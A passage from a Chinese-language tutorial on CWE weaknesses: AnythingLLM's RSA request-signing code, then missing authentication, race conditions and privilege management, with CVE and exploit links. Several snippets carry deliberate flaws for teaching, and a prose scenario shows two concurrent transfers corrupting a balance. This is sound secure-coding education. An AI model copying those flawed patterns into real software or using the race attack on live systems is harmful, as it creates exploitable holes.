    <span class="token keyword">return</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>#storageLoc<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>#pubKeyName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token comment">// Given a signed payload from private key from /app/server/ this signature should</span>
  <span class="token comment">// decode to match the textData provided. This class does verification only in collector.</span>
  <span class="token comment">// Note: The textData is typically the JSON stringified body sent to the document processor API.</span>
  <span class="token function">verify</span><span class="token punctuation">(</span>signature <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">,</span> textData <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
      <span class="token keyword">let</span> data <span class="token operator">=</span> textData<span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> textData <span class="token operator">!==</span> <span class="token string">"string"</span><span class="token punctuation">)</span> data <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> crypto<span class="token punctuation">.</span><span class="token function">verify</span><span class="token punctuation">(</span>
        <span class="token string">"RSA-SHA256"</span><span class="token punctuation">,</span>
        Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">#readPublicKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>signature<span class="token punctuation">,</span> <span class="token string">"hex"</span><span class="token punctuation">)</span>
      <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span> CommunicationKey <span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre></div><p class="x-p"><code class="x-inline-highlight">server/utils/comKey/index.js</code>：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">JavaScript</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre style="background:linear-gradient(180deg, transparent 216px, var(--bg-transparent-golden) 216px 432px, transparent 432px)"><code><span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"crypto"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"fs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"path"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> keyPath <span class="token operator">=</span>
  process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">NODE_ENV</span> <span class="token operator">===</span> <span class="token string">"development"</span>
    <span class="token operator">?</span> path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">../../storage/comkey</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
    <span class="token operator">:</span> path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">STORAGE_DIR</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">comkey</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// What does this class do?</span>
<span class="token comment">// This class generates a hashed version of some text (typically a JSON payload) using a rolling RSA key</span>
<span class="token comment">// that can then be appended as a header value to do integrity checking on a payload. Given the</span>
<span class="token comment">// nature of this class and that keys are rolled constantly, this protects the request</span>
<span class="token comment">// integrity of requests sent to the collector as only the server can sign these requests.</span>
<span class="token comment">// This keeps accidental misconfigurations of AnythingLLM that leaving port 8888 open from</span>
<span class="token comment">// being abused or SSRF'd by users scraping malicious sites who have a loopback embedded in a &lt;script>, for example.</span>
<span class="token comment">// Since each request to the collector must be signed to be valid, unsigned requests directly to the collector</span>
<span class="token comment">// will be dropped and must go through the /server endpoint directly.</span>
<span class="token keyword">class</span> <span class="token class-name">CommunicationKey</span> <span class="token punctuation">{</span>
  #privKeyName <span class="token operator">=</span> <span class="token string">"ipc-priv.pem"</span><span class="token punctuation">;</span>
  #pubKeyName <span class="token operator">=</span> <span class="token string">"ipc-pub.pem"</span><span class="token punctuation">;</span>
  #storageLoc <span class="token operator">=</span> keyPath<span class="token punctuation">;</span>

  <span class="token comment">// Init the class and determine if keys should be rolled.</span>
  <span class="token comment">// This typically occurs on boot up so key is fresh each boot.</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">generate <span class="token operator">=</span> <span class="token boolean">false</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>generate<span class="token punctuation">)</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">#generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token function">log</span><span class="token punctuation">(</span><span class="token parameter">text<span class="token punctuation">,</span> <span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">\x1b[36m[CommunicationKey]\x1b[0m </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>text<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token operator">...</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token function">#readPrivateKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>#storageLoc<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>#privKeyName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token function">#generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> keyPair <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">generateKeyPairSync</span><span class="token punctuation">(</span><span class="token string">"rsa"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
      <span class="token literal-property property">modulusLength</span><span class="token operator">:</span> <span class="token number">2048</span><span class="token punctuation">,</span>
      <span class="token literal-property property">publicKeyEncoding</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">"pkcs1"</span><span class="token punctuation">,</span>
        <span class="token literal-property property">format</span><span class="token operator">:</span> <span class="token string">"pem"</span><span class="token punctuation">,</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token literal-property property">privateKeyEncoding</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">"pkcs1"</span><span class="token punctuation">,</span>
        <span class="token literal-property property">format</span><span class="token operator">:</span> <span class="token string">"pem"</span><span class="token punctuation">,</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>fs<span class="token punctuation">.</span><span class="token function">existsSync</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>#storageLoc<span class="token punctuation">)</span><span class="token punctuation">)</span>
      fs<span class="token punctuation">.</span><span class="token function">mkdirSync</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>#storageLoc<span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">recursive</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span>
      <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>#storageLoc<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>#privKeyName<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
      keyPair<span class="token punctuation">.</span>privateKey
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span>
      <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>#storageLoc<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>#pubKeyName<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
      keyPair<span class="token punctuation">.</span>publicKey
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>
      <span class="token string">"RSA key pair generated for signed payloads within AnythingLLM services."</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token comment">// This instance of ComKey on server is intended for generation of Priv/Pub key for signing and decoding.</span>
  <span class="token comment">// this resource is shared with /collector/ via a class of the same name in /utils which does decoding/verification only</span>
  <span class="token comment">// while this server class only does signing with the private key.</span>
  <span class="token function">sign</span><span class="token punctuation">(</span>textData <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> crypto
      <span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token string">"RSA-SHA256"</span><span class="token punctuation">,</span> Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>textData<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">#readPrivateKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">"hex"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span> CommunicationKey <span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre></div></div><h3 class="x-h2"><a href="https://cwe.mitre.org/data/definitions/306.html" target="_blank" rel="noreferrer">【B】CWE-306: Missing Authentication for Critical Function</a></h3><p class="x-p">重要功能没有做权限认证。</p><h4 class="x-h3">Example 1</h4><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Java</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre style="background:linear-gradient(180deg, transparent 24px, var(--bg-transparent-golden) 24px 48px, transparent 48px, transparent 72px, var(--bg-transparent-golden) 72px 240px, transparent 240px, transparent 360px, var(--bg-transparent-golden) 360px 384px, transparent 384px)"><code><span class="token keyword">private</span> <span class="token keyword">boolean</span> isUserAuthentic <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">authenticateUser</span><span class="token punctuation">(</span><span class="token class-name">String</span> username<span class="token punctuation">,</span> <span class="token class-name">String</span> password<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment">// authenticate user,</span>
    <span class="token comment">// if user is authenticated then set variable to true</span>
    <span class="token comment">// otherwise set variable to false</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span>

<span class="token keyword">public</span> <span class="token class-name">BankAccount</span> <span class="token function">createNewBankAccount</span><span class="token punctuation">(</span><span class="token class-name">String</span> accountNumber<span class="token punctuation">,</span> <span class="token class-name">String</span> accountType<span class="token punctuation">,</span> <span class="token class-name">String</span> accountName<span class="token punctuation">,</span> <span class="token class-name">String</span> accountSSN<span class="token punctuation">,</span> <span class="token keyword">double</span> balance<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token class-name">BankAccount</span> account <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>isUserAuthentic<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        account <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BankAccount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        account<span class="token punctuation">.</span><span class="token function">setAccountNumber</span><span class="token punctuation">(</span>accountNumber<span class="token punctuation">)</span><span class="token punctuation">;</span>
        account<span class="token punctuation">.</span><span class="token function">setAccountType</span><span class="token punctuation">(</span>accountType<span class="token punctuation">)</span><span class="token punctuation">;</span>
        account<span class="token punctuation">.</span><span class="token function">setAccountOwnerName</span><span class="token punctuation">(</span>accountName<span class="token punctuation">)</span><span class="token punctuation">;</span>
        account<span class="token punctuation">.</span><span class="token function">setAccountOwnerSSN</span><span class="token punctuation">(</span>accountSSN<span class="token punctuation">)</span><span class="token punctuation">;</span>
        account<span class="token punctuation">.</span><span class="token function">setBalance</span><span class="token punctuation">(</span>balance<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> account<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p class="x-p">上面代码中高亮的部分是<span class="x-inline-strong">正确</span>的做法。如果忽视了验证，就存在风险了。</p><div class="x-highlightblock highlight-background-blue"><h4 class="x-h3">Example in real-world project</h4><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>OpenCVE：<a href="https://www.opencve.io/cve/CVE-2020-25966" target="_blank" rel="noreferrer" class="x-inline-link">CVE-2020-25966</a></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">Exploit</code>：<a href="https://gitlab.com/Gazzaz/Spectra_API_Issue/" target="_blank" rel="noreferrer" class="x-inline-link">https://gitlab.com/Gazzaz/Spectra_API_Issue/</a></p></div></div><p class="x-p">Sectona Spectra 3.2.0存在一个易受攻击的SOAP API端点，该端点会在未进行适当身份验证的情况下泄漏敏感信息。</p><p class="x-p">注：这个CVE是由于系统配置错误导致的。</p></div><h3 class="x-h2"><a href="https://cwe.mitre.org/data/definitions/362.html" target="_blank" rel="noreferrer">【C】CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization (&#x27;Race Condition&#x27;)</a></h3><p class="x-p">数据竞争，某段代码需要对共享资源进行临时、独占访问，但存在一个时间窗口，在该时间窗口内共享资源可被同时运行的另一个代码片段修改。</p><p class="x-p">数据竞争违反了以下两个原则：</p><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>排他性：代码序列被赋予对共享资源的排他性访问权限，即在原始序列完成执行之前，其他代码序列不能修改共享资源的属性。</p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p class="x-p">原子性：代码序列被视为一个单一的操作，即在执行期间不会被中断，也不会被其他代码序列中断。</p><p class="x-p">程序员可能会认为某些代码序列执行得太快，不会受到干扰代码序列的影响，但事实并非如此。例如，单个<code class="x-inline-highlight">x++</code>语句在代码层可能看起来是原子的，但在指令层实际上是非原子的，因为它涉及读取<code class="x-inline-highlight">x</code>的原始值、计算<code class="x-inline-highlight">x+1</code>、最后将结果赋值给<code class="x-inline-highlight">x</code>。</p></div></div><p class="x-p">干扰代码序列可以是可信的或不可信的。受信任的干扰代码序列出现在产品内部，攻击者无法修改，只能间接调用。不受信任的干扰代码序列可由攻击者直接编写，通常在易受攻击产品的外部。</p><h4 class="x-h3">Example 1</h4><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Perl</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token variable">$transfer_amount</span> <span class="token operator">=</span> GetTransferAmount<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$balance</span> <span class="token operator">=</span> GetBalanceFromDatabase<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$transfer_amount</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    FatalError<span class="token punctuation">(</span><span class="token string">"Bad Transfer Amount"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$newbalance</span> <span class="token operator">=</span> <span class="token variable">$balance</span> <span class="token operator">-</span> <span class="token variable">$transfer_amount</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$balance</span> <span class="token operator">-</span> <span class="token variable">$transfer_amount</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    FatalError<span class="token punctuation">(</span><span class="token string">"Insufficient Funds"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
SendNewBalanceToDatabase<span class="token punctuation">(</span><span class="token variable">$newbalance</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
NotifyUser<span class="token punctuation">(</span><span class="token string">"Transfer of $transfer_amount succeeded."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
NotifyUser<span class="token punctuation">(</span><span class="token string">"New balance: $newbalance"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p class="x-p">这个例子中<code class="x-inline-highlight">GetBalanceFromDatabase()</code>和<code class="x-inline-highlight">SendNewBalanceToDatabase()</code>可能会发生数据竞争。</p><p class="x-p">假设初始余额<code class="x-inline-highlight">balance</code>是<code class="x-inline-highlight">100.00</code>，一个攻击可以构造如下：</p><div class="x-oli"><div class="x-oli-number">3.</div><div class="x-oli-content-wrapper"><p>攻击者调起两个程序，<code class="x-inline-highlight">PROGRAM-1</code>和<code class="x-inline-highlight">PROGRAM-2</code>，使用同一账户。</p></div></div><div class="x-oli"><div class="x-oli-number">4.</div><div class="x-oli-content-wrapper"><p><code class="x-inline-highlight">PROGRAM-1</code>请求转账<code class="x-inline-highlight">80.00</code>，此时<code class="x-inline-highlight">PROGRAM-1</code>计算出<code class="x-inline-highlight">$newbalance</code>为<code class="x-inline-highlight">20.00</code>。</p></div></div><div class="x-oli"><div class="x-oli-number">5.</div><div class="x-oli-content-wrapper"><p><code class="x-inline-highlight">PROGRAM-1</code>调用<code class="x-inline-highlight">SendNewBalanceToDatabase(20.00)</code>，但是<span class="x-inline-strong">受到了延迟</span>。</p></div></div><div class="x-oli"><div class="x-oli-number">6.</div><div class="x-oli-content-wrapper"><p><code class="x-inline-highlight">PROGRAM-2</code>请求转账<code class="x-inline-highlight">1.00</code>，同理计算出<code class="x-inline-highlight">$newbalance</code>为<code class="x-inline-highlight">99.00</code>。</p></div></div><div class="x-oli"><div class="x-oli-number">7.</div><div class="x-oli-content-wrapper"><p><code class="x-inline-highlight">PROGRAM-2</code>调用<code class="x-inline-highlight">SendNewBalanceToDatabase(99.00)</code>。</p></div></div><div class="x-oli"><div class="x-oli-number">8.</div><div class="x-oli-content-wrapper"><p><code class="x-inline-highlight">PROGRAM-1</code>调用的<code class="x-inline-highlight">SendNewBalanceToDatabase(20.00)</code>提交到数据库。</p></div></div><div class="x-oli"><div class="x-oli-number">9.</div><div class="x-oli-content-wrapper"><p><code class="x-inline-highlight">PROGRAM-2</code>调用的<code class="x-inline-highlight">SendNewBalanceToDatabase(99.00)</code>提交到数据库。</p></div></div><p class="x-p">最后导致数据库记录的余额是错误的。</p><h4 class="x-h3">Example 2</h4><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">C</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">void</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token class-name">pthread_mutex_t</span> <span class="token operator">*</span>mutex<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">pthread_mutex_lock</span><span class="token punctuation">(</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/* access shared resource */</span>

    <span class="token function">pthread_mutex_unlock</span><span class="token punctuation">(</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p class="x-p">上面的函数尝试获取锁，以便对共享资源执行操作。不过上述函数没有检查<code class="x-inline-highlight">pthread_mutex_lock()</code>是否正常返回。如果因为一些原因导致<code class="x-inline-highlight">pthread_mutex_lock()</code>失败，那么这个例子会导致数据竞争。</p><p class="x-p">正确的做法是：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">C</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">int</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token class-name">pthread_mutex_t</span> <span class="token operator">*</span>mutex<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> result<span class="token punctuation">;</span>

    result <span class="token operator">=</span> <span class="token function">pthread_mutex_lock</span><span class="token punctuation">(</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">!=</span> result<span class="token punctuation">)</span>
        <span class="token keyword">return</span> result<span class="token punctuation">;</span>

    <span class="token comment">/* access shared resource */</span>

    <span class="token keyword">return</span> <span class="token function">pthread_mutex_unlock</span><span class="token punctuation">(</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><div class="x-highlightblock highlight-background-blue"><h4 class="x-h3">Example in real-world project</h4><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>OpenCVE：<a href="https://www.opencve.io/cve/CVE-2024-24254" target="_blank" rel="noreferrer" class="x-inline-link">CVE-2024-24254</a></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">Exploit</code><code class="x-inline-highlight">Patch</code>：<a href="https://github.com/Drone-Lab/PX4-Autopilot/blob/report-can-not-pause-vulnerability/Multi-Threaded%20Race%20Condition%20bug%20found%20in%20PX4%20cause%20drone%20can%20not%20PAUSE.md" target="_blank" rel="noreferrer" class="x-inline-link">https://github.com/Drone-Lab/PX4-Autopilot/blob/report-can-not-pause-vulnerability/Multi-Threaded%20Race%20Condition%20bug%20found%20in%20PX4%20cause%20drone%20can%20not%20PAUSE.md</a></p></div></div></div><h3 class="x-h2"><a href="https://cwe.mitre.org/data/definitions/269.html" target="_blank" rel="noreferrer">【C】CWE-269: Improper Privilege Management</a></h3><p class="x-p">权限管理不当，程序没有正确地管理用户的权限。</p><h4 class="x-h3">Example 1</h4><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">def</span> <span class="token function">makeNewUserDir</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> invalidUsername<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment">#avoid CWE-22 and CWE-78</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Usernames cannot contain invalid characters'</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        raisePrivileges<span class="token punctuation">(</span><span class="token punctuation">)</span>
        os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string">'/home/'</span> <span class="token operator">+</span> username<span class="token punctuation">)</span>
        lowerPrivileges<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Unable to create new user directory for user:'</span> <span class="token operator">+</span> username<span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

    <span class="token keyword">return</span> <span class="token boolean">True</span>
